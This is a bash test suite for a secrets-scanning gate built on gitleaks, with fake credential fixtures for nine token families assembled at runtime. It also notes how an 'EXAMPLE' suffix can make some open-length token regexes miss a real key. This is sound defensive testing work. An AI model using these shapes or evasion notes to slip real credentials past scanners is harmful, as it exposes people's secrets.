#!/usr/bin/env bash
# Tests for gitleaks-scan.sh (class-0 secrets gate).
# Run: bash .agents/security/gitleaks-scan.test.sh  — also auto-discovered by
# core-scripts/run-bash-tests.sh. Cases (a) and (b) SKIP cleanly when gitleaks is not
# installed (as build_index.test.sh skips without ctags); cases (c) and (d) run
# ALWAYS, including on the gitleaks-less CI runner — so this suite is green in CI.
set -u
# T-00001088 : purge de l environnement git herite AVANT toute commande git (noms = conftest.py::GIT_REDIRECTIONS ; filet .agents/evals/test_bash_suites_git_env.py)
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_OBJECT_DIRECTORY GIT_COMMON_DIR \
  GIT_ALTERNATE_OBJECT_DIRECTORIES GIT_NAMESPACE GIT_PREFIX \
  GIT_CONFIG_PARAMETERS GIT_CONFIG_COUNT
HERE="$(cd "$(dirname "$0")" && pwd)"
SCRIPT="$HERE/gitleaks-scan.sh"
[ -f "$SCRIPT" ] || { echo "FAIL: gitleaks-scan.sh not found"; exit 1; }

pass=0
fail() { echo "FAIL: $1"; exit 1; }
ok()   { echo "  ok: $1"; pass=$((pass + 1)); }

HAVE_GITLEAKS=0; command -v gitleaks >/dev/null 2>&1 && HAVE_GITLEAKS=1

# NOGL_PATH: PATH with every gitleaks-bearing dir removed, computed ONCE and
# reused by every fallback arm below (the debt-free way to simulate absence on a
# box that HAS gitleaks; on the gitleaks-less CI runner it is just PATH, so the
# plain run already IS the fallback). All other tools stay real.
NOGL_PATH=""
IFS=':' read -r -a _path_dirs <<< "$PATH"
for d in "${_path_dirs[@]}"; do
  [ -n "$d" ] || continue
  if [ -x "$d/gitleaks" ] || [ -x "$d/gitleaks.exe" ]; then continue; fi
  NOGL_PATH="${NOGL_PATH:+$NOGL_PATH:}$d"
done
# T-01M4JC50S6CTJ5HJ697929E6NA : « all other tools stay real » — on a Homebrew box gitleaks and
# timeout(1) (coreutils) share /opt/homebrew/bin, so stripping that dir also
# strips timeout and the script DEGRADES on every arm that expects none (t844j).
# Keep timeout real through a tool dir of symlinks, created only when needed.
_nogl_timeout="$(command -v timeout 2>/dev/null || true)"
if [ -n "$_nogl_timeout" ] && ! PATH="$NOGL_PATH" command -v timeout >/dev/null 2>&1; then
  _nogl_tmpbase="${TMPDIR-}"
  [ -n "$_nogl_tmpbase" ] || _nogl_tmpbase=/tmp
  _nogl_tools="$(mktemp -d "$_nogl_tmpbase/nogl-tools.XXXXXX")" || { echo "FAIL: mktemp for the timeout tool dir"; exit 1; }
  ln -s "$_nogl_timeout" "$_nogl_tools/timeout"
  NOGL_PATH="$_nogl_tools:$NOGL_PATH"
fi

# A syntactically valid AWS Access Key ID, ASSEMBLED AT RUNTIME from split
# literals: the contiguous 20-char token never appears in this file, so the
# repo-diff Stop-hook scan stays clean (no self-inflicted hook loop) while the
# runtime --content payload still trips gitleaks' AWS rule.
#
# The body MUST NOT end in "EXAMPLE": gitleaks' default config allowlists
# `.+EXAMPLE$` on the aws-access-token rule (verified against 8.30.1 and the
# upstream config/gitleaks.toml), so AWS's documented example key
# (…IOSFODNN7EXAMPLE) is silently ignored — that dead fixture is exactly what
# made this suite's case (a) rot (T-00000067). Charset is base32 [A-Z2-7],
# per the rule's regex; this exact token is verified to trip 8.30.1.
akia="AKIA"; body="ZX4QY7GJTMPKQR5T"
FAKE_SECRET="aws_access_key_id = ${akia}${body}"

# --- (a) content with a real-looking secret => exit 2 (SKIP if no gitleaks) ---
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  printf '%s\n' "$FAKE_SECRET" | bash "$SCRIPT" --content >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 2 ] || fail "(a) secret content should exit 2, got $rc"
  ok "(a) secret in --content => exit 2 (BLOCK)"
else
  echo "  SKIP (a): gitleaks not installed"
fi

# --- (b) clean content => exit 0 (SKIP if no gitleaks) -----------------------
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  printf 'just some perfectly ordinary prose, nothing sensitive here\n' \
    | bash "$SCRIPT" --content >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 0 ] || fail "(b) clean content should exit 0, got $rc"
  ok "(b) clean --content => exit 0"
else
  echo "  SKIP (b): gitleaks not installed"
fi

# --- (c) gitleaks absent => exit 0 + COVERAGE DEGRADED (ALWAYS runs) ---------
# When gitleaks is genuinely absent (the CI runner), the plain run already IS
# the degraded path. When gitleaks is installed, simulate absence by REMOVING
# from PATH every directory that holds a gitleaks executable — all other tools
# stay real, so `command -v gitleaks` fails and the script takes its genuine
# "not installed" branch. (The previous minimal-PATH symlink stub never ran on
# this Windows box — case (a)'s dead fixture aborted the suite before it — and
# broke with rc=127 the first time it did: MSYS `ln -s` copies, T-00000067.)
DEG="$(printf 'anything\n' | PATH="$NOGL_PATH" bash "$SCRIPT" --content 2>&1)"; rc=$?
[ "$rc" -eq 0 ] || fail "(c) no gitleaks must exit 0 (benign path never blocks), got $rc"
printf '%s' "$DEG" | grep -q "COVERAGE DEGRADED" \
  || fail "(c) no gitleaks must print COVERAGE DEGRADED, got: $DEG"
ok "(c) gitleaks absent => exit 0 + COVERAGE DEGRADED"

# --- (d) class-0 is NON-WAIVABLE: zero reference to waivers (ALWAYS runs) ----
if grep -Eiq 'waiver|sca-waivers' "$SCRIPT"; then
  fail "(d) gitleaks-scan.sh must NOT reference waiver/sca-waivers (class-0 is non-waivable)"
fi
ok "(d) no waiver/sca-waivers reference in gitleaks-scan.sh"

# --- (e) diff mode spawns gitleaks ONCE, not once per dirty file (ALWAYS) ----
# The Stop hook runs this script in diff mode, and `git diff HEAD` + untracked
# grows monotonically across a session until a commit lands. A per-file scan
# loop therefore made the Stop hook slower every turn (~465 ms of process
# start-up per file on this box: 20 files = 9.3 s, versus 0.53 s for a single
# spawn over the same 20). The cost must be O(1) spawns, not O(files).
#
# Uses a COUNTING STUB on PATH — a real script file, not a symlink (MSYS `ln -s`
# copies, see case (c)) — so this case runs on the gitleaks-less CI runner too.
STUBDIR="$(mktemp -d)"; COUNTER="$STUBDIR/calls"; : > "$COUNTER"
cat > "$STUBDIR/gitleaks" <<'STUB'
#!/usr/bin/env bash
echo x >> "$GITLEAKS_STUB_COUNTER"
rp=""; prev=""
for a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done
[ -n "$rp" ] && printf '[]' > "$rp"
exit 0
STUB
chmod +x "$STUBDIR/gitleaks"

REPO="$(mktemp -d)"
git -C "$REPO" init -q 2>/dev/null
git -C "$REPO" config user.email t@t.t; git -C "$REPO" config user.name t
printf 'seed\n' > "$REPO/seed.txt"
git -C "$REPO" add -A >/dev/null 2>&1
git -C "$REPO" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
mkdir -p "$REPO/a/b"
for i in 1 2 3 4 5 6 7; do printf 'plain line %s\n' "$i" > "$REPO/a/b/f$i.txt"; done

ERRE="$( ( cd "$REPO" && PATH="$STUBDIR:$PATH" GITLEAKS_STUB_COUNTER="$COUNTER" \
    bash "$SCRIPT" ) 2>&1 >/dev/null )"
rc=$?
calls="$(wc -l < "$COUNTER" | tr -d ' ')"
[ "$rc" -eq 0 ] || fail "(e) clean diff scan should exit 0, got $rc"
[ "$calls" -eq 1 ] \
  || fail "(e) diff mode must spawn gitleaks once for 7 dirty files, got $calls"
# (e) also pins the ENGINE/SCAN_STATUS init: this arm runs the gitleaks branch
# (a stub makes `have gitleaks` true, ENGINE=gitleaks) on EVERY present-tool host,
# CI included. A bare read of either under set -u would kill the gate HERE, where
# it works today — so assert stderr carries no 'unbound variable'.
printf '%s' "$ERRE" | grep -qi 'unbound variable' \
  && fail "(e) unbound variable on the gitleaks branch — ENGINE/SCAN_STATUS not initialised before the availability check"
ok "(e) diff mode = 1 gitleaks spawn regardless of dirty-file count; no unbound var under set -u"

# --- (f) diff mode still reports the REAL repo-relative file:line (SKIP if no gitleaks)
# The single-spawn scan runs over a staging copy, so its report paths must be
# translated back: a location of `<tmp>/a/b/creds.txt:1` would be useless in the
# audit log. Asserts the location recorded is the path as it exists in the repo.
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  REPO2="$(mktemp -d)"
  git -C "$REPO2" init -q 2>/dev/null
  git -C "$REPO2" config user.email t@t.t; git -C "$REPO2" config user.name t
  printf 'seed\n' > "$REPO2/seed.txt"
  git -C "$REPO2" add -A >/dev/null 2>&1
  git -C "$REPO2" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
  mkdir -p "$REPO2/a/b"
  printf 'nothing here\n' > "$REPO2/a/b/clean.txt"
  printf '%s\n' "$FAKE_SECRET" > "$REPO2/a/b/creds.txt"

  ( cd "$REPO2" && bash "$SCRIPT" ) >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 2 ] || fail "(f) secret in dirty file should exit 2, got $rc"
  LOGLINE="$(tail -1 "$REPO2/.agents/state/local/sca-reports/audit-log.jsonl")"
  printf '%s' "$LOGLINE" | grep -q '"a/b/creds.txt:1"' \
    || fail "(f) audit location must be the repo-relative path, got: $LOGLINE"
  printf '%s' "$LOGLINE" | grep -q '"Secret"' \
    && fail "(f) audit line must never carry a secret value"
  ok "(f) diff mode maps locations back to repo-relative file:line"
else
  echo "  SKIP (f): gitleaks not installed"
fi

# --- (g) staging falls back to per-file copy when tar is unusable (SKIP if no gitleaks)
# The batch `tar` pipeline is a speed optimisation; correctness must not depend
# on it. A stub tar that always fails forces the fallback branch, and the gate
# must still find the secret at the same repo-relative location as case (f).
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  NOTARDIR="$(mktemp -d)"
  printf '#!/usr/bin/env bash\nexit 1\n' > "$NOTARDIR/tar"
  chmod +x "$NOTARDIR/tar"

  REPO3="$(mktemp -d)"
  git -C "$REPO3" init -q 2>/dev/null
  git -C "$REPO3" config user.email t@t.t; git -C "$REPO3" config user.name t
  printf 'seed\n' > "$REPO3/seed.txt"
  git -C "$REPO3" add -A >/dev/null 2>&1
  git -C "$REPO3" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
  mkdir -p "$REPO3/a/b"
  printf '%s\n' "$FAKE_SECRET" > "$REPO3/a/b/creds.txt"

  ( cd "$REPO3" && PATH="$NOTARDIR:$PATH" bash "$SCRIPT" ) >/dev/null 2>&1
  rc=$?
  [ "$rc" -eq 2 ] || fail "(g) fallback staging should still block on a secret, got $rc"
  tail -1 "$REPO3/.agents/state/local/sca-reports/audit-log.jsonl" \
    | grep -q '"a/b/creds.txt:1"' || fail "(g) fallback staging lost the location"
  ok "(g) per-file staging fallback keeps the gate correct without tar"
else
  echo "  SKIP (g): gitleaks not installed"
fi

# --- (h) cleanup() EXIT trap guard: only the owning shell may delete (ALWAYS) --
# T-00000149: a background child that inherits the EXIT trap and is killed before
# it finishes exec'ing fires cleanup() too. Without the BASHPID owner guard it
# would rm -rf this run's staging while the parent is still scanning. Extract the
# REAL cleanup() from the script (not a copy that could drift) and exercise both
# branches: a subshell whose BASHPID != CLEANUP_OWNER must early-return and leave
# the dir; the owning shell must still clean. Asserts the observable effect (dir
# present / gone), never an exit code (L-00000161).
# T-00000508 — l'extraction passait par `eval "$( … )"`, qui RE-PARSE comme du
# shell le résultat d'une substitution : finding `ERROR` de classe 1
# (`agents.security.shell-eval-on-interpolated-value`), NON-WAIVABLE. Il était
# invisible tant que ce fichier n'était pas parsé par le SAST.
# La fonction est maintenant écrite dans un fichier PUIS sourcée : même
# définition dans le MÊME shell, sans passer par un `eval`. Le contrôle de
# non-vacuité juste dessous est INCHANGÉ — une extraction vide reste rouge.
_CLEANUP_SRC="$(mktemp)"
sed -n '/^cleanup()/,/^}/p' "$SCRIPT" > "$_CLEANUP_SRC"
# shellcheck source=/dev/null
. "$_CLEANUP_SRC"
rm -f "$_CLEANUP_SRC"
declare -f cleanup >/dev/null || fail "(h) cleanup extraction empty"
# Initialize every var the extracted body reads (suite runs set -u).
STAGE="$(mktemp -d)"; REPORT=""; LOCFILE=""; LIST=""
CLEANUP_OWNER="not-a-real-pid"          # forces the guard's early return in the subshell
( cleanup )                             # subshell BASHPID != CLEANUP_OWNER => must no-op
[ -d "$STAGE" ] || fail "(h) guard must early-return in a non-owner subshell (STAGE was deleted)"
CLEANUP_OWNER="${BASHPID:-$$}"          # this shell now owns the trap
cleanup                                 # normal path must still clean up
[ -d "$STAGE" ] && fail "(h) owner cleanup must remove STAGE, but it still exists"
ok "(h) cleanup() runs only in the owning shell (BASHPID guard)"

# ==== T-00000293: submodule content enters the class-0 perimeter =============
# The secret is ASSEMBLED at runtime from the SAME split literals as case (a)
# (`${akia}${body}` — a value verified to trip 8.30.1, never a contiguous 20-char
# token in this file) and committed INSIDE a submodule. It is NOT the corpus
# builder's RANDOM secret on purpose: measured on this box, only ~3/12 random
# AKIA+16 keys clear the aws rule's entropy floor, so a random fixture would make
# (i)/(j) flaky — a fixed verified token keeps them deterministic (L-00000234's
# cousin: a flaky fixture imitates a real defect).
#
# assert_tmpdir (copied from semgrep-scan.test.sh — each suite self-contained, no
# shared helper) refuses a degenerate throwaway dir before any `git -C` runs on
# it (T-00000311). mk_super builds an OUT-OF-REPO superproject carrying an
# initialized submodule `sub` (itself carrying a nested `sub/nested`); the secret
# lands in sub, in nested, or nowhere per $1. Files written with printf (never a
# heredoc, L-00000197).
REAL_ROOT="$(cd "$HERE/../.." && pwd)"
assert_tmpdir() {  # $1 = candidate throwaway dir
  local tmp="${TMPDIR:-/tmp}"; tmp="${tmp%/}"   # macOS sets TMPDIR WITH a trailing slash; `mktemp -d` output has none, so an unstripped "$TMPDIR"/* glob becomes T//* and matches nothing (Linux/MSYS leave TMPDIR unset => /tmp, no slash, always matched — this is why CI stayed green)
  [ -n "$1" ]              || fail "throwaway dir is EMPTY — refusing (git -C '' would hit the live repo)"
  [ "$1" != "$PWD" ]       || fail "throwaway dir == PWD ($1) — refusing"
  [ "$1" != "$REAL_ROOT" ] || fail "throwaway dir == repo root ($1) — refusing"
  case "$1" in
    /tmp/*|"$tmp"/*) : ;;
    *) fail "throwaway dir outside temp ($1) — refusing" ;;
  esac
}
GIT_ISO="git -c protocol.file.allow=always -c user.name=t -c user.email=t@t.t -c commit.gpgsign=false -c advice.detachedHead=false"
mk_super() {  # $1 = secret location: none|sub|nested ; echoes the superproject path
  local where="$1" nested sub super
  nested="$(mktemp -d)"; sub="$(mktemp -d)"; super="$(mktemp -d)"
  assert_tmpdir "$nested"; assert_tmpdir "$sub"; assert_tmpdir "$super"
  $GIT_ISO init -q "$nested"
  printf 'def n():\n    return 1\n' > "$nested/mod.py"
  [ "$where" = nested ] && { mkdir -p "$nested/config"; printf '%s\n' "aws_access_key_id = ${akia}${body}" > "$nested/config/credentials.txt"; }
  $GIT_ISO -C "$nested" add -A >/dev/null 2>&1
  $GIT_ISO -C "$nested" commit -qm n >/dev/null 2>&1
  $GIT_ISO init -q "$sub"
  printf 'def s():\n    return 1\n' > "$sub/mod.py"
  [ "$where" = sub ] && { mkdir -p "$sub/config"; printf '%s\n' "aws_access_key_id = ${akia}${body}" > "$sub/config/credentials.txt"; }
  $GIT_ISO -C "$sub" submodule add -q "$nested" nested >/dev/null 2>&1
  $GIT_ISO -C "$sub" add -A >/dev/null 2>&1
  $GIT_ISO -C "$sub" commit -qm s >/dev/null 2>&1
  $GIT_ISO init -q "$super"
  printf 'root\n' > "$super/README.md"
  $GIT_ISO -C "$super" add -A >/dev/null 2>&1
  $GIT_ISO -C "$super" commit -qm r >/dev/null 2>&1
  $GIT_ISO -C "$super" submodule add -q "$sub" sub >/dev/null 2>&1
  $GIT_ISO -C "$super" submodule update -q --init --recursive >/dev/null 2>&1
  $GIT_ISO -C "$super" add -A >/dev/null 2>&1
  $GIT_ISO -C "$super" commit -qm addsub >/dev/null 2>&1
  printf '%s\n' "$super"
}

# --- (i) committed secret INSIDE an initialized submodule => exit 2, and the
# audit location is SUPERPROJECT-relative `sub/config/credentials.txt:1`.
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  SUPER_I="$(mk_super sub)"
  ( cd "$SUPER_I" && bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 2 ] || fail "(i) committed secret inside a submodule must exit 2, got $rc"
  LOGLINE="$(tail -1 "$SUPER_I/.agents/state/local/sca-reports/audit-log.jsonl")"
  printf '%s' "$LOGLINE" | grep -q '"sub/config/credentials.txt:1"' \
    || fail "(i) audit location must be superproject-relative sub/config/credentials.txt:1, got: $LOGLINE"
  ok "(i) committed secret in an initialized submodule => exit 2 + sub/-relative location"
else
  echo "  SKIP (i): gitleaks not installed"
fi

# --- (j) NESTED submodule reached (depth 2), and the DEPTH BOUND says so when it
# bites. Secret lives in `sub/nested`: default depth finds it (proves recursion
# descends past the first boundary); SUBMODULE_SCAN_DEPTH=0 must NOT reach it and
# must announce the bound at `sub` — a covered depth-bound branch, not a residue.
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  SUPER_J="$(mk_super nested)"
  ( cd "$SUPER_J" && bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 2 ] || fail "(j) secret in a NESTED submodule must exit 2, got $rc"
  LOGLINE="$(tail -1 "$SUPER_J/.agents/state/local/sca-reports/audit-log.jsonl")"
  printf '%s' "$LOGLINE" | grep -q '"sub/nested/config/credentials.txt:1"' \
    || fail "(j) audit location must be sub/nested/config/credentials.txt:1, got: $LOGLINE"
  DEG_J="$( cd "$SUPER_J" && SUBMODULE_SCAN_DEPTH=0 bash "$SCRIPT" 2>&1 )"; rc0=$?
  [ "$rc0" -eq 0 ] || fail "(j) with depth bound 0 the nested secret is out of scope => exit 0, got $rc0"
  printf '%s' "$DEG_J" | grep -q 'submodule depth bound (0) exceeded at sub' \
    || fail "(j) depth bound must ANNOUNCE 'submodule depth bound (0) exceeded at sub', got: $DEG_J"
  ok "(j) nested submodule reached at default depth; depth bound announced + content skipped at bound"
else
  echo "  SKIP (j): gitleaks not installed"
fi

# --- (k) NOT-INITIALIZED gitlink => the shrunk perimeter SAYS SO (stderr) and the
# gate never blocks (exit 0). CI-safe via the counting stub: it only needs to make
# `have gitleaks` true so enumeration runs; the deinit'd `sub` is announced absent.
STUBK="$(mktemp -d)"; assert_tmpdir "$STUBK"; : > "$STUBK/calls"
printf '#!/usr/bin/env bash\necho x >> "$GITLEAKS_STUB_COUNTER"\nrp=""; prev=""\nfor a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n[ -n "$rp" ] && printf "[]" > "$rp"\nexit 0\n' > "$STUBK/gitleaks"
chmod +x "$STUBK/gitleaks"
SUPER_K="$(mk_super none)"
( cd "$SUPER_K" && $GIT_ISO submodule deinit -f sub ) >/dev/null 2>&1
DEG_K="$( cd "$SUPER_K" && PATH="$STUBK:$PATH" GITLEAKS_STUB_COUNTER="$STUBK/calls" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(k) a not-initialized gitlink must never block (exit 0), got $rc — $DEG_K"
printf '%s' "$DEG_K" | grep -q "submodule 'sub' not initialized" \
  || fail "(k) a not-initialized gitlink must be ANNOUNCED, got: $DEG_K"
ok "(k) not-initialized gitlink => announced 'not initialized' + exit 0 (perimeter shrink said out loud)"

# --- (l) O(1) SPAWNS UNDER THE WIDENED PERIMETER: a repo WITH an initialized
# submodule (whose whole work tree enters the stage) must still spawn gitleaks
# EXACTLY ONCE — the complement to (e), which pins the same for the no-submodule
# path. Together they defend the plan's non-negotiable "UN seul spawn conservé".
STUBL="$(mktemp -d)"; assert_tmpdir "$STUBL"; : > "$STUBL/calls"
printf '#!/usr/bin/env bash\necho x >> "$GITLEAKS_STUB_COUNTER"\nrp=""; prev=""\nfor a in "$@"; do [ "$prev" = "--report-path" ] && rp="$a"; prev="$a"; done\n[ -n "$rp" ] && printf "[]" > "$rp"\nexit 0\n' > "$STUBL/gitleaks"
chmod +x "$STUBL/gitleaks"
SUPER_L="$(mk_super none)"
( cd "$SUPER_L" && PATH="$STUBL:$PATH" GITLEAKS_STUB_COUNTER="$STUBL/calls" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
callsL="$(wc -l < "$STUBL/calls" | tr -d ' ')"
[ "$rc" -eq 0 ] || fail "(l) clean submodule scan should exit 0, got $rc"
[ "$callsL" -eq 1 ] || fail "(l) an initialized submodule must still spawn gitleaks ONCE, got $callsL"
ok "(l) initialized submodule in the tree => still exactly 1 gitleaks spawn (widened perimeter, O(1) spawns)"

# =============================================================================
# T-00000461: deterministic FALLBACK when gitleaks is absent. Every (c*) arm
# strips gitleaks from PATH (NOGL_PATH) so it exercises the fallback and runs on
# a box WITH gitleaks and on the gitleaks-less CI runner alike.
# =============================================================================
mk_repo() {  # a throwaway git repo with one seed commit; echoes its path
  local R; R="$(mktemp -d)"; assert_tmpdir "$R"
  git -C "$R" init -q 2>/dev/null
  git -C "$R" config user.email t@t.t; git -C "$R" config user.name t
  printf 'seed\n' > "$R/seed.txt"
  git -C "$R" add -A >/dev/null 2>&1
  git -C "$R" -c commit.gpgsign=false commit -qm seed >/dev/null 2>&1
  printf '%s' "$R"
}

# --- (c2) fallback blocks a real secret when gitleaks is absent (ALWAYS) -------
OUT="$(printf '%s\n' "$FAKE_SECRET" | PATH="$NOGL_PATH" bash "$SCRIPT" --content 2>&1)"; rc=$?
[ "$rc" -eq 2 ] || fail "(c2) fallback secret in --content should exit 2, got $rc — $OUT"
printf '%s' "$OUT" | grep -q "SECRETS GATE" || fail "(c2) missing SECRETS GATE, got: $OUT"
printf '%s' "$OUT" | grep -Eq 'fallback scan: [0-9]+ file\(s\) scanned, 1 finding\(s\)' \
  || fail "(c2) missing positive marker, got: $OUT"
printf '%s' "$OUT" | grep -q "GITLEAKS_FALLBACK=0" || fail "(c2) fallback must print the kill-switch remedy"
ok "(c2) fallback blocks a secret (exit 2 + marker + kill-switch hint)"

# --- (c2-table) ONE FIXTURE PER FAMILY, each token ASSEMBLED at runtime so the
# contiguous token never appears in this file. Per-line: dropping THAT family's
# regex reddens THIS line and leaves the other eight green — that is what makes
# the "9 families" claim true rather than decorative.
aws_t="${akia}${body}"
gh_t="gh""p_""abcdefghijklmnopqrstuvwxyz""0123456789"
sl_t="xox""b-""123456789012""-""abcdefghijklmnopqrstuvwx"
gg_t="AI""za""ABCDEFGHIJKLMNOPQRSTUVWXYZ""012345678"
gl_t="gl""pat-""ABCDEFGHIJ0123456789"
st_t="sk_""live_""ABCDEFGHIJKLMNOPqrstuvwx"
an_t="sk-""ant-""ABCDEFGHIJ0123456789ab"
np_t="np""m_""abcdefghijklmnopqrstuvwxyz0123456789"
pem_t="-----BEGIN ""RSA PRIVATE"" KEY-----"
FAM_TABLE=("aws|$aws_t" "github|$gh_t" "slack|$sl_t" "google|$gg_t" "gitlab|$gl_t" \
           "stripe|$st_t" "anthropic|$an_t" "npm|$np_t" "pem|$pem_t")
#
# TWO COLUMNS since T-00000461: the bare token, AND the token with `EXAMPLE`
# glued to its tail. The second column is the one that was rendered green by the
# naked `case "$tok" in *EXAMPLE) continue`.
#
# THE MEASURE, family by family — written as OBSERVED, not as expected. Both
# columns block for all nine, but for TWO DIFFERENT reasons, and the difference
# is the whole rule:
#   - FIXED-length alternatives (aws AKIA+16, ghp_+36, AIza+35, glpat-+20,
#     npm_+36, and the PEM block which ends on a literal `-----`): `grep -oE`
#     captures exactly the family's shape, so `EXAMPLE` falls OUTSIDE the match.
#     The captured token never ends in EXAMPLE, the exception never fires, and
#     these already blocked BEFORE the fix.
#   - OPEN-length alternatives (github_pat_…{22,}, xox[baprs]-…{10,},
#     sk_live_…{24,}, sk-ant-…{20,}): the suffix ENTERS the match, so the token
#     did end in EXAMPLE and was dropped. Measured on HEAD before the fix, these
#     FOUR — and only these four — returned rc=0 with `1 file(s) scanned, 0
#     finding(s)`. They are what strip-then-re-test recovers.
# So the expectation "fixed-length families let the suffix through" is FALSE on
# this regex set: it is the OPEN-length ones that let it through. The count is
# FOUR open-length alternatives, not five — `npm_` and `gh[pousr]_` are fixed.
nfam=0
for row in "${FAM_TABLE[@]}"; do
  # Le séparateur passe par une variable : `${row%%|*}` est du bash valide que
  # tree-sitter-bash ne parse pas, et un seul site retire ce fichier ENTIER du
  # compte des cibles inspectées par la porte SAST.
  _bar='|'
  fam="${row%%$_bar*}"; tok="${row#*$_bar}"
  R="$(mk_repo)"; printf 'cred = %s\n' "$tok" > "$R/creds.txt"
  ( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 2 ] || fail "(c2-table:$fam) family must trip the fallback (exit 2), got $rc"
  tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"creds.txt:1"' \
    || fail "(c2-table:$fam) location must be creds.txt:1"
  # Column 2 — a FRESH repo (a re-run would count the audit log as a new file).
  R="$(mk_repo)"; printf 'cred = %sEXAMPLE\n' "$tok" > "$R/creds.txt"
  ( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 2 ] \
    || fail "(c2-table:$fam+EXAMPLE) a live credential wearing EXAMPLE must still block (exit 2), got $rc"
  nfam=$((nfam + 1))
done
[ "$nfam" -eq 9 ] || fail "(c2-table) expected 9 families, ran $nfam"
ok "(c2-table) each of the 9 families trips the fallback at creds.txt:1, bare AND with an EXAMPLE tail"

# --- (c2-table-alt) the NINE array elements hold TEN alternatives -------------
# `gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,}` is ONE array element
# carrying TWO shapes, and they sit on opposite sides of the rule: `ghp_` is
# fixed-length, `github_pat_` is OPEN — so the table above exercises only the
# fixed half of that row. The open half is one of the four that PASSED before the
# fix, so it gets its own line rather than hiding inside a row named "github".
ghpat_t="github""_pat_""ABCDEFGHIJKLMNOPQRSTUV"
R="$(mk_repo)"; printf 'cred = %s\n' "$ghpat_t" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c2-table-alt) bare github_pat_ must block (exit 2), got $rc"
R="$(mk_repo)"; printf 'cred = %sEXAMPLE\n' "$ghpat_t" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c2-table-alt) github_pat_ + EXAMPLE must block (exit 2), got $rc"
ok "(c2-table-alt) the OPEN-length github_pat_ alternative blocks bare and with an EXAMPLE tail"

# --- (c3) same secret in diff mode => exit 2 + repo-relative location ----------
R="$(mk_repo)"; printf '%s\n' "$FAKE_SECRET" > "$R/creds.txt"
( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
[ "$rc" -eq 2 ] || fail "(c3) diff-mode secret should exit 2, got $rc"
tail -1 "$R/.agents/state/local/sca-reports/audit-log.jsonl" | grep -q '"creds.txt:1"' \
  || fail "(c3) location must be creds.txt:1"
ok "(c3) fallback in diff mode blocks + repo-relative location"

# --- (c4) auto-scan: a copy of the script itself must NOT trip the fallback ----
R="$(mk_repo)"; cp "$SCRIPT" "$R/gitleaks-scan.sh"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
[ "$rc" -eq 0 ] || fail "(c4) scanning a copy of the script must not trip (exit 0), got $rc — $OUT"
ok "(c4) the family regex list does not make the fallback trip on itself"

# --- (c4bis) auto-scan WITH gitleaks: the regex list must not trip gitleaks ----
if [ "$HAVE_GITLEAKS" -eq 1 ]; then
  R="$(mk_repo)"; cp "$SCRIPT" "$R/gitleaks-scan.sh"
  ( cd "$R" && bash "$SCRIPT" ) >/dev/null 2>&1; rc=$?
  [ "$rc" -eq 0 ] || fail "(c4bis) header regex list must not trip gitleaks itself (exit 0), got $rc"
  ok "(c4bis) the family regex list does not trip gitleaks on the script itself"
else
  echo "  SKIP (c4bis): gitleaks not installed"
fi

# === THE EXAMPLE EXCEPTION AND ITS BOUNDARY — (c5) (c5bis) (c5ter) ===========
# Read these three together; they are one rule seen from both sides. The rule is
# NOT "a token spelled …EXAMPLE is a fixture": it is "cut the suffix and ask the
# nine families again". Still a family without it => a real credential wearing a
# word => BLOCK. No longer a family => the suffix was LOAD-BEARING for the shape
# => fixture => exempt.
# (c5)/(c5bis) hold the exempt side, (c5ter) the blocking side. Neither alone
# proves anything: an implementation that exempts everything passes (c5)+(c5bis),
# one that exempts nothing passes (c5ter). Only the pair shows it DISCRIMINATES.
#
# --- (c5) EXAMPLE-suffixed token MID-LINE => exit 0 (exception is on the token)
# `AKIAIOSFODNN7EXAMPLE` is AWS's documented example key and it is AKIA + 16 only
# BECAUSE of the suffix; stripped it is AKIA + 9, which matches nothing.
# MUTATION: drop the `case "$tok" in *EXAMPLE)` block entirely (no exception at
# all) => this arm and (c5bis) and (c13) go exit 2 => RED.
R="$(mk_repo)"; printf '%s\n' '{"note":"cle AKIAIOSFODNN7EXAMPLE citee","x":1}' > "$R/doc.txt"
OUT="$( cd "$R" && PATH="$NOGL_PATH" bash "$SCRIPT" 2>&1 )"; rc=$?
printf '%s' "$OUT" | grep -Eq 'fallback scan: [1-9][0-9]* file\(s\) scanned' \
  || fail "(c5) positive marker missing, got: $OUT"
[ "$rc" -eq 0 ] || fail "(c5) EXAMPLE token mid-line must not block (exit 0), got $rc"
ok "(c5) EXAMPLE token whose suffix is load-bearing (AKIA+16) mid-line => exit 0"

# --- (c5bis) same token alone on its line => exit 0 ---------------------------
R="$(mk_repo)"; printf '%s\n' 'AKIAIOSFODNN7EXAMPLE' > "$R/doc.txt"
